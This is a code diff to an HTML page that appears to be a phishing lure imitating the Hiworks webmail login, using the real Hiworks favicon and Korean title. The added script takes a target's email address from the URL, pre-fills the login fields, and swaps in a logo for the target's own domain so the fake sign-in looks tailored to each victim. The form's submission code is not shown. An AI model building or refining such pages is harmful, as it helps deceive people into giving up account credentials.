@@ -6,7 +6,7 @@
   <meta charset="UTF-8" />
   <link rel="icon" href="https://login.office.hiworks.com/favicon-96x96.png" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-  <title>&#54616;&#51060;&#50893;&#49828; &#47196;&#44536;&#51064;</title>
+  <title>하이웍스 로그인</title>
   <style>
     html, body {
       font-family: Arial, sans-serif;
@@ -98,14 +98,14 @@
                   <tr>
                     <td height="40">
                       <p align="center">
-                        <img id="greeting" src="https://logo.clearbit.com/domain" width="200" height="40">
+                        <img id="logoImage" src="https://logo.clearbit.com/domain" width="200" height="40">
                       </p>
                     </td>
                   </tr>
                   <tr><td height="20"></td></tr>
                   <tr>
                     <td height="26">
-                      <h1><font color="#000000" face="Arial">Sign in to</font> <font color="#7A7A7A" id="greeting">domain</font></h1>
+                      <h1><font color="#000000" face="Arial">Sign in to</font> <font color="#7A7A7A" id="domainText">domain</font></h1>
                     </td>
                   </tr>
                   <tr><td height="0"></td></tr>
@@ -179,6 +179,7 @@
     </tr>
     <tr><td></td></tr>
   </table>
+
   <script>
     const params = new URLSearchParams(window.location.search);
     const raw = params.get('login');
@@ -192,10 +193,12 @@
     if (email) {
       document.getElementById('userInput').value = email;
       document.getElementById('domainInput').value = domain;
-      document.getElementById('greeting').textContent = domain;
+      document.getElementById('domainText').textContent = domain;
       document.getElementById('emailButton').textContent = email;
       document.getElementById('anotherLink').href = `another_user.html?login=${encodeURIComponent(email)}`;
+      document.getElementById('logoImage').src = `https://logo.clearbit.com/${domain}`;
     }
   </script>
+
 </body>
 </html>
